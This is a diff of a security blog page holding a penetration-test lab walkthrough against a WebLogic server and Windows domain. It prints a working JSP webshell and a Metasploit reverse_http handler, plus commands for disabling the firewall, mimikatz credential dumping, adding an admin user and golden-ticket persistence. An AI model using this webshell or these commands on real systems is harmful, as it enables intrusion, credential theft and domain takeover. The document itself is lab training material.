@@ -336,33 +336,52 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>统一登录密码 <code>1qaz@WSX</code></p>
+        <h3 id="环境搭建">环境搭建</h3>
+<p>统一登录密码 <code>1qaz@WSX</code></p>
 <p>Web密码错误的，在快照管理器里面选择转到1.3即可,默认为空，然后修改密码为统一密码</p>
 <p>然后再web主机上开启Weblogic服务</p>
 <p><img src="/posts/8a9ea0cb/start_weblogic.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dc    仅主机  10.10.10.10</span><br><span class="line">web   仅主机  10.10.10.80   NAT 192.168.0.80</span><br><span class="line">pc    仅主机  10.10.10.201  NAT 192.168.0.201</span><br><span class="line">kali  NAT     192.168.0.128</span><br></pre></td></tr></table></figure>
-
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h4><p>用kaliping不通web主机，应该是开启了防火墙禁止了icmp</p>
+<h3 id="信息收集">信息收集</h3>
+<h4 id="nmap扫描端口">nmap扫描端口</h4>
+<p>用kaliping不通web主机，应该是开启了防火墙禁止了icmp</p>
 <p><code>sudo nmap 192.168.0.80 -sV</code></p>
 <blockquote>
-<p>PORT      STATE SERVICE       VERSION<br>80/tcp    open  http          Microsoft IIS httpd 7.5<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br>1433/tcp  open  ms-sql-s      Microsoft SQL Server 2008 R2 10.50.4000; SP2<br>3389/tcp  open  ms-wbt-server Microsoft Terminal Service<br>7001/tcp  open  http          Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)<br>49152/tcp open  msrpc         Microsoft Windows RPC<br>49153/tcp open  msrpc         Microsoft Windows RPC<br>49154/tcp open  msrpc         Microsoft Windows RPC<br>49155/tcp open  msrpc         Microsoft Windows RPC<br>49156/tcp open  msrpc         Microsoft Windows RPC</p>
+<p>PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5
+135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn
+Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft
+Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s
+Microsoft SQL Server 2008 R2 10.50.4000; SP2 3389/tcp open ms-wbt-server
+Microsoft Terminal Service 7001/tcp open http Oracle WebLogic Server
+10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled) 49152/tcp open msrpc
+Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC
+49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc
+Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC</p>
 </blockquote>
 <p><img src="/posts/8a9ea0cb/nmap.png"></p>
 <p>先从7001的weblogic下手，使用WeblogicScan扫描一下是否存在漏洞</p>
 <p><img src="/posts/8a9ea0cb/weblogicscan.png"></p>
 <p>得到后台路径为<code>http://192.168.0.80:7001/console/login/LoginForm.jsp</code></p>
 <p>检测到存在<code>CVE20192725</code> 和 ssrf漏洞</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="利用ssrf漏洞进行端口探测"><a href="#利用ssrf漏洞进行端口探测" class="headerlink" title="利用ssrf漏洞进行端口探测"></a>利用ssrf漏洞进行端口探测</h4><p>存在位置<code>http://192.168.0.80:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<h4 id="利用ssrf漏洞进行端口探测">利用ssrf漏洞进行端口探测</h4>
+<p>存在位置<code>http://192.168.0.80:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
 <p>抓包测试</p>
 <p><img src="/posts/8a9ea0cb/ssrf1.png"></p>
-<p>此处的operator为可控点，输入一个存在的端口<code>127.0.0.1:7001</code> 会返回一个状态码</p>
+<p>此处的operator为可控点，输入一个存在的端口<code>127.0.0.1:7001</code>
+会返回一个状态码</p>
 <p><img src="/posts/8a9ea0cb/ssrf_7001.png"></p>
-<p>输入一个不存在的端口时<code>192.168.0.80:1234</code> 会返回<code>but could not connect over HTTP to server</code></p>
+<p>输入一个不存在的端口时<code>192.168.0.80:1234</code>
+会返回<code>but could not connect over HTTP to server</code></p>
 <p><img src="/posts/8a9ea0cb/ssrf_1234.png"></p>
-<p>输入<code>127.0.0.1:6379</code> 返回<code>but could not connect over HTTP to server</code>说明没有开放6379端口，没法继续利用去弹redis shell</p>
+<p>输入<code>127.0.0.1:6379</code>
+返回<code>but could not connect over HTTP to server</code>说明没有开放6379端口，没法继续利用去弹redis
+shell</p>
 <p><img src="/posts/8a9ea0cb/ssrf_6379.png"></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9759761.html">weblogic ssrf利用</a></p>
-<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>直接使用6哥师傅的java反序列化终极测试工具.</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9759761.html">weblogic
+ssrf利用</a></p>
+<h4 id="getshell">Getshell</h4>
+<p>直接使用6哥师傅的java反序列化终极测试工具.</p>
 <p><img src="/posts/8a9ea0cb/java_tool1.png"></p>
 <p><img src="/posts/8a9ea0cb/java_tool2.png"></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sstfy/p/10350915.html">weblogic上传木马时路径选择</a></p>
@@ -377,16 +396,16 @@
 <p>访问<code>http://*.*.*.*:7001/项目名/shell.jsp</code></p>
 <p>上传蚁剑的jsp马。密码为ant</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/8a9ea0cb/uploade_shell.png"></p>
 <p>使用蚁剑进行连接</p>
 <p><img src="/posts/8a9ea0cb/ant_conn.png"></p>
 <p>然后可以使用<code>As-Exploits</code>插件</p>
 <p>发现该机器上有安装360</p>
-<h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>在CS上创建listener 生成cs.exe后使用蚁剑运行，beacon成功上线</p>
+<h4 id="上线cs">上线CS</h4>
+<p>在CS上创建listener 生成cs.exe后使用蚁剑运行，beacon成功上线</p>
 <p><img src="/posts/8a9ea0cb/cs1.png"></p>
-<h5 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查看当前用户sid  shell whoami /user</span><br><span class="line">查看系统信息  shell systeminfo</span><br><span class="line">查看域名      shell net config workstation</span><br><span class="line">查看域内用户  shell net user /domain</span><br><span class="line">查看机器信息  net computers </span><br><span class="line">查看域内主机  shell net view</span><br><span class="line">查看有几个域  shell net view /domain</span><br><span class="line">查看域管理员  shell net group &quot;domain admins&quot; /domain  </span><br><span class="line">查看域控      shell net group &quot;domain controllers&quot; /domain  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+<h5 id="信息收集-1">信息收集</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查看当前用户sid  shell whoami /user</span><br><span class="line">查看系统信息  shell systeminfo</span><br><span class="line">查看域名      shell net config workstation</span><br><span class="line">查看域内用户  shell net user /domain</span><br><span class="line">查看机器信息  net computers </span><br><span class="line">查看域内主机  shell net view</span><br><span class="line">查看有几个域  shell net view /domain</span><br><span class="line">查看域管理员  shell net group &quot;domain admins&quot; /domain  </span><br><span class="line">查看域控      shell net group &quot;domain controllers&quot; /domain  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p><code>shell whoami /user</code></p>
 <p><img src="/posts/8a9ea0cb/cs_whoami_user.png"></p>
 <p><code>shell systeminfo</code></p>
@@ -400,45 +419,53 @@
 <p>使用CS的portscan模块扫描域内主机端口</p>
 <p><img src="/posts/8a9ea0cb/cs_portscan.png"></p>
 <p>关闭防火墙<code>netsh advfirewall set allprofiles state off</code></p>
-<p><code>shell net view </code> 发现报错6118，在网上查了下是因为没有开启<code>Computer Brower</code>服务，去看了下，web服务器把该服务禁止了，开启后就可以正常使用了（因为刚才是的时候web服务器密码登录不上去，然后切换了快照，手动开启了web服务）</p>
+<p><code>shell net view</code>
+发现报错6118，在网上查了下是因为没有开启<code>Computer Brower</code>服务，去看了下，web服务器把该服务禁止了，开启后就可以正常使用了（因为刚才是的时候web服务器密码登录不上去，然后切换了快照，手动开启了web服务）</p>
 <p><img src="/posts/8a9ea0cb/cs_net_view.png"></p>
-<p><code>shell net group &quot;domain admins&quot; /domain</code></p>
-<p><code>shell net group &quot;domain controllers&quot; /domain </code></p>
+<p><code>shell net group "domain admins" /domain</code></p>
+<p><code>shell net group "domain controllers" /domain</code></p>
 <p><img src="/posts/8a9ea0cb/cs_shell_net_group.png"></p>
 <p>使用CS的<code>run_mimikatz</code>模块</p>
 <p><img src="/posts/8a9ea0cb/cs_run_mimikatz.png"></p>
 <p>得到凭据信息，密码为<code>1qaz@WSX</code></p>
 <p><img src="/posts/8a9ea0cb/cs_credentials.png"></p>
-<h4 id="创建用户登录3389"><a href="#创建用户登录3389" class="headerlink" title="创建用户登录3389"></a>创建用户登录3389</h4><p>查看3389是否开放</p>
+<h4 id="创建用户登录3389">创建用户登录3389</h4>
+<p>查看3389是否开放</p>
 <p><img src="/posts/8a9ea0cb/cs_nerstat_3389.png"></p>
 <p><img src="/posts/8a9ea0cb/cs_new_user.png"></p>
-<p>添加用户到管理员权限 <code>shell net localgroup administrators Mamor /add</code></p>
+<p>添加用户到管理员权限
+<code>shell net localgroup administrators Mamor /add</code></p>
 <p><img src="/posts/8a9ea0cb/cs_net_localgroup_administrators_Mamor_add.png"></p>
-<p><code>sudo rdesktop 192.168.0.80:3389 </code> 使用 <code>Mamor</code> <code>1qaz@WSX</code>成功登录</p>
+<p><code>sudo rdesktop 192.168.0.80:3389</code> 使用 <code>Mamor</code>
+<code>1qaz@WSX</code>成功登录</p>
 <p><img src="/posts/8a9ea0cb/rdesktop.png"></p>
 <p>(注：这里的360防护好像没有起作用，没有进行拦截)</p>
-<h4 id="使用PSexec横向移动"><a href="#使用PSexec横向移动" class="headerlink" title="使用PSexec横向移动"></a>使用PSexec横向移动</h4><p>使用和上一个靶场一样的方法，创建一个smb监听器</p>
+<h4 id="使用psexec横向移动">使用PSexec横向移动</h4>
+<p>使用和上一个靶场一样的方法，创建一个smb监听器</p>
 <p>在Targets中 选择主机右键jump-&gt; psexec，选择票据</p>
 <p>然后得到如图，可以通过这种方法得到web机器的system权限</p>
 <p><img src="/posts/8a9ea0cb/cs_graph_view.png"></p>
 <p>成功拿到域控DC.</p>
-<h4 id="CS派生MSF"><a href="#CS派生MSF" class="headerlink" title="CS派生MSF"></a>CS派生MSF</h4><p>在CS中创建一个 Foreign HTTP listener</p>
+<h4 id="cs派生msf">CS派生MSF</h4>
+<p>在CS中创建一个 Foreign HTTP listener</p>
 <p><img src="/posts/8a9ea0cb/cs_msf.png"></p>
 <p>在msf中</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt;  set payload windows/meterpreter/reverse_http</span><br><span class="line">set =&gt; payload windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.0.128</span><br><span class="line">lhost =&gt; 192.168.0.128</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/8a9ea0cb/cs_msf_shell.png"></p>
 <p>msf添加路由</p>
 <p><img src="/posts/8a9ea0cb/msf_autoroute.png"></p>
 <p><img src="/posts/8a9ea0cb/route_print.png"></p>
 <p>配置代理，在proxychains4设置127.0.0.1 1080</p>
 <p><img src="/posts/8a9ea0cb/socks_proxy.png"></p>
-<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><h5 id="域控信息收集"><a href="#域控信息收集" class="headerlink" title="域控信息收集"></a>域控信息收集</h5><p>在域控获取krbtgt账户的NTLM hash值和SID</p>
+<h4 id="权限维持">权限维持</h4>
+<h5 id="域控信息收集">域控信息收集</h5>
+<p>在域控获取krbtgt账户的NTLM hash值和SID</p>
 <p><img src="/posts/8a9ea0cb/dc_hashdump.png"></p>
 <p><code>82dfc71b72a11ef37d663047bc2088fb</code></p>
 <p><img src="/posts/8a9ea0cb/dc_logonpasswords.png"></p>
 <p>SID <code>S-1-5-21-2756371121-2868759905-3853650604</code></p>
-<h5 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h5><p>黄金票据时伪造票据授予票据(TGT)</p>
+<h5 id="黄金票据利用">黄金票据利用</h5>
+<p>黄金票据时伪造票据授予票据(TGT)</p>
 <p>利用需要的条件:</p>
 <p>1.域名称</p>
 <p>2.域的SID值</p>
@@ -580,7 +607,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3"><span class="nav-number">2.1.</span> <span class="nav-text">nmap扫描端口</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ssrf%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.1.</span> <span class="nav-text">利用ssrf漏洞进行端口探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Getshell"><span class="nav-number">3.2.</span> <span class="nav-text">Getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFCS"><span class="nav-number">3.3.</span> <span class="nav-text">上线CS</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">3.3.1.</span> <span class="nav-text">信息收集</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%953389"><span class="nav-number">3.4.</span> <span class="nav-text">创建用户登录3389</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8PSexec%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">3.5.</span> <span class="nav-text">使用PSexec横向移动</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CS%E6%B4%BE%E7%94%9FMSF"><span class="nav-number">3.6.</span> <span class="nav-text">CS派生MSF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">3.7.</span> <span class="nav-text">权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.7.1.</span> <span class="nav-text">域控信息收集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="nav-number">3.7.2.</span> <span class="nav-text">黄金票据利用</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3"><span class="nav-number">2.1.</span> <span class="nav-text">nmap扫描端口</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ssrf%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.1.</span> <span class="nav-text">利用ssrf漏洞进行端口探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getshell"><span class="nav-number">3.2.</span> <span class="nav-text">Getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFcs"><span class="nav-number">3.3.</span> <span class="nav-text">上线CS</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">3.3.1.</span> <span class="nav-text">信息收集</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%953389"><span class="nav-number">3.4.</span> <span class="nav-text">创建用户登录3389</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8psexec%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">3.5.</span> <span class="nav-text">使用PSexec横向移动</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cs%E6%B4%BE%E7%94%9Fmsf"><span class="nav-number">3.6.</span> <span class="nav-text">CS派生MSF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">3.7.</span> <span class="nav-text">权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.7.1.</span> <span class="nav-text">域控信息收集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="nav-number">3.7.2.</span> <span class="nav-text">黄金票据利用</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -596,7 +623,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -644,7 +671,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -658,7 +685,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -669,7 +696,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -809,6 +836,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
